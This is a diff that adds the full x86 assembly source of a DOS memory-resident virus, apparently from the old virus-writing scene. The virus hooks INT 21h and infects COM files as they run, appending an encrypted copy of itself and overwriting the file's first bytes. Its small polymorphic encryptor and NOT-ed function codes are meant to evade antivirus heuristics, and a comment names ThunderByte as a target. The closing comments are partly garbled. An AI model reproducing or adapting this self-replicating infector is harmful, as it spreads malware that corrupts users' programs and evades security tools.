@@ -1,0 +1,260 @@
+
+MARKER  EQU     0FBFA                   ;CLI STI  GREAT TO HAVE THIS MARKER
+
+dw MARKER				;MARKER
+JMP ENTRY_POINT
+
+ENTRY_POINT:
+ALIGN   EQU     $
+
+        PUSHA
+        PUSH ES,DS			;GETTING PUSHED AROUND HUH? WELL...
+
+	MOV BP,W[0103]			;GET DELTA OFFSET
+        LEA DI,[ENCR_START+BP]		;LOAD THE ADDRESS
+        PUSH DI                         ;DI POINTS TO ENCR_START => WHERE
+                                        ;WE WILL RETURN
+SPiCE:
+        MOV CX,ENCR_SIZE_HALF
+        MOV SI,DI                       ;SOURCE & DESTINATION BYTES ARE THE
+                                        ;SAME...
+CRYPT:
+        LODSW				;LOAD A WORD
+PART_1:
+        NOP
+        NOP
+PART_2:
+        NOP
+        NOP                             ;THESE NOP'S WILL BE FILLED OUT BY
+                                        ;SPiCE_CREATE
+        STOSW				;STORE A WORD
+        LOOP CRYPT
+        RET				;RETURN TO CALLER
+
+ENCR_START:        
+        MOV AX,04266H			;MEMORY RESIDENCE CHECKER
+        INT 21H
+        CMP BX,04266H			;BX SHOULD BE 04266H
+        JE IS_RESIDENT                  ;OH NO... THAT FOOL HAS ALREADY
+                                        ;STARTED ME...
+
+        MOV AX,020H
+        MOV ES,AX
+        XOR DI,DI
+        LEA SI,[ENTRY_POINT+BP]
+        MOV CL,VIR_SIZE_HALF            ;DS:SI -> VIRUS , ES:DI ->
+                                        ;0020:0000 (CH = 0)
+        REP MOVSW               	;COPY VIRUS TO 0020:0000
+
+	MOV DS,CX			;CX = 0
+        MOV SI,084H                     ;DS:SI = 0000:0084 -> VECTOR FOR
+                                        ;INT 21H
+        MOV DI,OFFSET OLDOFF-ALIGN      ;ES:DI = 0020:OLD_OFF -> SAVE INT
+                                        ;21H
+	db 066
+        MOVSW                           ;db 066 + MOVSW = MOVSD .. MOVE 4
+                                        ;BYTES
+	MOV W[084],OFFSET NEW_21-ALIGN  ;STORE NEW INT VECTOR
+	MOV W[086],AX			;AX = 0020	
+	
+IS_RESIDENT:
+        POP DS,ES
+        POPA				;RESTORE THEM REGS
+        MOV AX,04C66H
+        INT 21H                         ;THIS SHOULD FUCK THUNDERBYTE UP A
+                                        ;BIT... (HOPEFULLY)
+
+BUFFER:					;5 BYTES BUFFER :)
+        MOV AH,04CH
+        INT 21H
+        CLI				;THE ORIGINAL START OF THE FILE.
+
+JMP_START:
+	dw MARKER			;MARKER
+        JMP 0000			;THE REPUTATED 3 BYTE JUMP
+JMP_PLACE       EQU     $-2		;WHERE TO PUT IT...
+
+RESTORE_PROGRAM:
+        POP AX                  ;AN INT CALL -> [SP] = OFFSET TO RETURN TO,
+                                ;[SP+2] = SEGMENT TO
+				;RETURN TO, [SP+4] = FLAGS ; GET OFFSET
+        PUSHA			;GET RID OF THOSE REGS FOR NOW
+        MOV DI,SI               ;ES & DS WILL CONTAIN CORRECT SEGMENT
+                                ; SI = 0100H
+        MOV SI,AX		;DS:SI -> BUFFER, WHERE ORIGINAL CODE IS
+	db 066
+        MOVSW                   ;db 066 ; MOVSW = MOVSD -> MOVES 4 BYTES ...
+	MOVSB
+        POPA			;RESTORE REGS
+	XOR AX,AX		;CLEAN AX
+        MOV SP,DI		;DI = 0FFFE
+        PUSH DS,SI		;DS = CS, SI = 0100H
+        RETF			;RETURN TO CS:0100H (SOUND FAMILIAR?)
+
+YOU_SUCKER:
+        NOT AX			;NEGATE AX AGAIN... TO RESTORE IT
+        XCHG BX,AX              ;PUT AX IN BX USING 1 BYTE OPCODE, INSTEAD
+                                ;OF 2 BYTE MOV BX,AX
+        IRET			;THAT SUCKER... HE STARTED ME AGAIN
+
+NEW_21:
+        NOT AX			;TO FOOL OF HEURISTICS
+        CMP AX,NOT 04266H        
+        JE YOU_SUCKER		;STARTED ME AGAIN HUH?
+
+        CMP AX,NOT 04C66H
+        JE RESTORE_PROGRAM	;RESTORE PROGRAM?
+
+        CMP AH,NOT 04BH
+        JE INFECT_ME_PLEEEEESE	;STARTING A PROGRAM... VERY VERY INTERESTING
+        
+OLD_21:
+        NOT AX			;MAKE AX NORMAL AGAIN
+        db 0EAH                 ;JUMP FAR
+OLDOFF: dw 0
+OLDSEG: dw 0
+
+END_INFECT:
+	MOV AH,03EH
+	INT 21H
+
+	POP ES,DS
+        POPA                ;RESTORE THOSE REGS, SO THAT NO SHIT HAPPENS...
+	JMP SHORT OLD_21
+
+INFECT_ME_PLEEEEESE:
+        PUSHA
+        PUSH DS,ES		;SAVE REGS FOR L8Rs
+
+        MOV AX,03D02H
+        INT 21H                 ;OPEN THE PHILE...
+
+        XCHG BX,AX              ;PUT HANDLE IN BX...
+        MOV AH,03FH
+        MOV DX,OFFSET BUFFER-ALIGN
+        PUSH CS
+        POP DS
+        MOV CX,5
+        INT 21H			;READ IN 5 FIRST BYTES...
+
+        MOV AX,W[BUFFER-ALIGN]  ;WHAT DID WE READ???!
+        
+        CMP AX,MARKER
+        JE END_INFECT		;TRY NOT TO INFECT ALREADY INFECTED FILES...
+
+        CMP AL,'M'              ;NO EXEs ... IN THIS VERSION
+	JE END_INFECT
+
+	MOV AX,04202
+	CWD			;SINCE AX < 08000, THEN DX = 0
+	XOR CX,CX
+	INT 21H			;END OF FILE PLEASE...
+
+        CMP DX,0
+        JA END_INFECT           ;NO FILES ABOVE 64k...
+        CMP AH,0EB
+        JA END_INFECT           ;AROUND 60000 SHOULD WORK FINE...
+
+	MOV DX,AX		;AX IS A RANDOM NUMBER... (SIZE OF FILE)
+
+	SUB AX,5
+        MOV W[JMP_PLACE-ALIGN],AX ;ENTRY_POINT, CAN ALSO BE USED AS DELTA
+                                  ;OFFSET
+
+        AND AL,0F               ;GET RID OF THOSE EXTRA BITS (0-F LEFT)
+        SHR AL,01               ;DIVIDE BY 2 .. (0-7 LEFT) (8 NUMBAHS, 8
+
+SPiCE_CREATE:
+        CMP AL,0
+        JNE SPiCE2
+        MOV AX,0C8C1            ;ROR AX,
+        MOV CX,0FB08            ;08 ; STI
+				;NO JMP NEEDED... AS THE AL>8....
+SPiCE2:
+        CMP AL,1
+        JNE SPiCE3
+        MOV AX,0C0C1            ;ROL AX,
+        MOV CX,0FB08            ;08 ; STI
+SPiCE3:
+        CMP AL,2
+        JNE SPiCE4
+        MOV AH,DL               ;
+        MOV AL,035              ;XOR AX, (VALUE IN DX)
+        MOV CH,0FB              ;XXXX ; STI
+        MOV CL,DH
+SPiCE4:
+        CMP AL,3
+        JNE SPiCE5
+        MOV AX,0D0F7            ;NOT AX
+        MOV CX,0FAFB            ;CLI ; STI
+SPiCE5:
+        CMP AL,4
+        JNE SPiCE6
+        MOV AX,0E086            ;XCHG AH,AL
+        MOV CX,0FAFB            ;CLI ; STI
+SPiCE6:
+        CMP AL,5
+        JNE SPiCE7
+	MOV AX,0C486		;XCHG AL,AH
+	MOV CX,0FAFB		;CLI ; STI
+SPiCE7:
+        CMP AL,6
+        JNE SPiCE8
+        MOV AX,0D0F7            ;NOT AX
+        MOV CX,0E086		;XCHG AH,AL
+SPiCE8:
+        MOV AX,0D0F7            ;NOT AX
+        MOV CX,0C486		;XCHG AL,AH
+
+SPiCED:
+        MOV W[OFFSET PART_1-ALIGN],AX
+        MOV W[OFFSET PART_2-ALIGN],CX		;BETTER STORE IT...
+
+	MOV AX,0A000
+	MOV ES,AX
+	XOR DI,DI
+	XOR SI,SI		;DS:SI -> VIRUS, ES:DI -> 0A000:0000
+	MOV CX,VIR_SIZE_HALF	;COPY IT ... LET'S HOPE THERE IS
+        REP MOVSW               ;NO VGA GRAPHIX NOW :) OR YOU'LL SEE A LOT
+                                ;OF SHIT...
+
+	PUSH ES
+	POP DS			;DS = ES = A000
+	
+	MOV DI,ENCR_START-ALIGN
+	CALL SPiCE		;DS:SI = ES:DI ... CRYPT IT :)
+
+        MOV AH,040H
+        CWD			;WE START WRITING FROM DS:0000 (DS=A000)
+        MOV CX,VIR_SIZE         ;THE whole VIRUS :)
+        INT 21H                 ;WRITE AWAY
+
+	MOV AX,04200		
+	CWD
+	XOR CX,CX
+	INT 21H			;NEXT STOP: START OF FILE
+
+	PUSH CS
+	POP DS			;DS = CS = 0020H
+
+	MOV AH,040H
+	MOV DX,OFFSET JMP_START-ALIGN
+	MOV CL,5		;CH IS 0...
+	INT 21H			;WRITE DOWN !THEJUMP! :)
+
+	JMP SHORT END_INFECT
+
+db 'MAKE BY LEE & ALU'				;HEHE.. SO THAT AV-GUYS
+                                                ;DON'T PUT A STRANGE
+						;NAME ON MY VIRUS! :)
+
+ENCR_END:
+
+ENCR_SIZE       EQU     $-ENCR_START
+ENCR_SIZE_HALF  EQU     (ENCR_SIZE / 2)+1
+
+VIR_SIZE        EQU     $-OFFSET ENTRY_POINT
+VIR_SIZE_HALF   EQU     (VIR_SIZE / 2)+1 ;INTERESTING AND MOST
+                                         ;USEFUL CONSTANTSIR_SIZE / 2)+1
+                                         ;INTERESTING AND MOST USEFUL
+                                         ;CONSTANTS
